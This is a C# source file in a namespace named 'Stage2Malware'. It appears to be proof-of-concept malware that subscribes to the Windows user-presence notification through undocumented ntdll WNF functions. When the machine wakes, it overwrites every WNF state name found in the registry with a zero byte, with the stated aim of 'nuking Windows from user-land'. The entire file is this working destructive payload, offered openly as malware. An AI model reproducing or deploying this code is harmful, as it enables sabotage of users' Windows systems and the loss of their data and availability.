using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Stage2Malware
{
    class Program
    {
        public const ulong WNF_SEB_USER_PRESENT = 0x41840B3EA3BC6875;

        static void Main()
        {
            IntPtr e_subscription;
            var e = QueryWnf(WNF_SEB_USER_PRESENT);

            Log("Subscribing to 0x41840B3EA3BC6875 via Windows Kernel for user-presence changes");

            var s_e = RtlSubscribeWnfStateChangeNotification(
                out e_subscription,
                WNF_SEB_USER_PRESENT,
                e.Changestamp,
                new CallBackDelegate(SubscribeWnf),
                0, 0, 0, 0
            );

            while (true) { Thread.Sleep(500); }
        }

        public static void Log(string message)
        {
            Console.WriteLine(string.Format("[MALWARE] {0}", message));
        }

        public static WnfStateData QueryWnf(ulong state)
        {
            var data = new WnfStateData();
            int tries = 10;
            int size = 4096;
            while (tries-- > 0)
            {
                using (var buffer = new SafeHGlobalBuffer(size))
                {
                    int status;
                    status = ZwQueryWnfStateData(ref state, null, IntPtr.Zero, out int changestamp, buffer, ref size);

                    if (status == 0xC0000023)
                        continue;
                    data = new WnfStateData(changestamp, buffer.ReadBytes(size));
                }
            }
            return data;
        }

        public static int UpdateWnf(ulong state, byte[] data)
        {
            using (var buffer = data.ToBuffer())
            {
                ulong state_name = state;

                return ZwUpdateWnfStateData(ref state_name, buffer,
                    buffer.Length, null, IntPtr.Zero, 0, false);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public class WnfType
        {
            public Guid TypeId;
        }

        public class WnfStateData
        {
            public int Changestamp { get; }
            public byte[] Data { get; }

            public WnfStateData() { }
            public WnfStateData(int changestamp, byte[] data)
            {
                Changestamp = changestamp;
                Data = data;
            }
        }

        [DllImport("ntdll.dll")]
        public static extern int ZwQueryWnfStateData(
            ref ulong StateId,
            [In, Optional] WnfType TypeId,
            [Optional] IntPtr Scope,
            out int Changestamp,
            SafeBuffer DataBuffer,
            ref int DataBufferSize
        );

        [DllImport("ntdll.dll")]
        public static extern int ZwUpdateWnfStateData(
            ref ulong StateId,
            SafeBuffer DataBuffer,
            int DataBufferSize,
            [In, Optional] WnfType TypeId,
            [Optional] IntPtr Scope,
            int MatchingChangestamp,
            [MarshalAs(UnmanagedType.Bool)] bool CheckChangestamp
        );

        public class SafeHGlobalBuffer : SafeBuffer
        {
            public SafeHGlobalBuffer(int length)
              : this(length, length) { }

            protected SafeHGlobalBuffer(int allocation_length, int total_length)
                : this(Marshal.AllocHGlobal(allocation_length), total_length, true) { }

            public SafeHGlobalBuffer(IntPtr buffer, int length, bool owns_handle)
              : base(owns_handle)
            {
                Length = length;
                Initialize((ulong)length);
                SetHandle(buffer);
            }

            public static SafeHGlobalBuffer Null { get { return new SafeHGlobalBuffer(IntPtr.Zero, 0, false); } }

            protected override bool ReleaseHandle()
            {
                if (!IsInvalid)
                {
                    Marshal.FreeHGlobal(handle);
                    handle = IntPtr.Zero;
                }
                return true;
            }

            public byte[] ReadBytes(ulong byte_offset, int count)
            {
                byte[] ret = new byte[count];
                ReadArray(byte_offset, ret, 0, count);
                return ret;
            }

            public byte[] ReadBytes(int count)
            {
                return ReadBytes(0, count);
            }

            public SafeHGlobalBuffer(byte[] data) : this(data.Length)
            {
                Marshal.Copy(data, 0, handle, data.Length);
            }

            public int Length
            {
                get; private set;
            }
        }

        [ComVisible(true)]
        public delegate void ContextCallback(object state);

        [DllImport("ntdll.dll")]
        public static extern int RtlSubscribeWnfStateChangeNotification(
            out IntPtr Subscription,
            ulong StateId,
            int Changestamp,
            CallBackDelegate Callback,
            [Out, Optional] int CallbackContext,
            [In, Optional] int TypeId,
            [In, Optional] int SerializationGroup,
            [In, Optional] int Undetermined
        );

        public delegate int CallBackDelegate(ulong p1, IntPtr p2, IntPtr p3, IntPtr p4, [MarshalAs(UnmanagedType.LPWStr)] string p5, int p6);

        public static int SubscribeWnf(
            ulong p1,
            IntPtr p2,
            IntPtr p3,
            IntPtr p4,
            [MarshalAs(UnmanagedType.LPWStr)] string p5,
            int p6
        )
        {
            Log("Windows Kernel executed callback delegate!");

            if(p1 == WNF_SEB_USER_PRESENT)
            {
                var data = Encoding.UTF8.GetBytes(p5)[0];
                switch (data)
                {
                    case 1:
                        Log(string.Format("Sleep has been triggered: {0}", data));
                        Log("Waiting to trigger 0-byte writes via Windows Kernel");
                        break;
                    case 3:
                        Log(string.Format("Awake has been triggered: {0}", data));
                        Log("Nuking Windows from user-land via 0-byte writes!");

                        RegistryKey key = Registry.LocalMachine.OpenSubKey(@"System\CurrentControlSet\Control\Notifications");
                        var states = key.GetValueNames();
                        foreach (var state in states)
                        {
                            ulong state_hex = ulong.Parse(state, System.Globalization.NumberStyles.HexNumber);
                            UpdateWnf(state_hex, new byte[1] { 0x00 });
                        }
                        break;
                    default:
                        break;
                }
            }
            return 0x00000000;
        }
    }

    static class BufferUtils
    {
        public static Program.SafeHGlobalBuffer ToBuffer(this byte[] value)
        {
            return new Program.SafeHGlobalBuffer(value);
        }
    }
}
